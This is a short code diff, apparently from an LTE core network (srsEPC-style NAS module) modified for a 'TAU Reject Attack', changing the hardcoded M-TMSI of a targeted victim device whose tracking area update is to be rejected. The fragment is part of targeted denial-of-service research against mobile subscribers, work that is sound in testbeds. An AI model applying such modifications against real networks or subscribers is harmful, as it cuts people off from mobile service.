@@ -847,7 +847,7 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   // MODIFIED - TAU Reject Attack
   //nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
 
-  uint32_t victim_m_tmsi = 0xd02ae964;
+  uint32_t victim_m_tmsi = 0xf144067e;
 
   if(m_tmsi == victim_m_tmsi) {
     nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
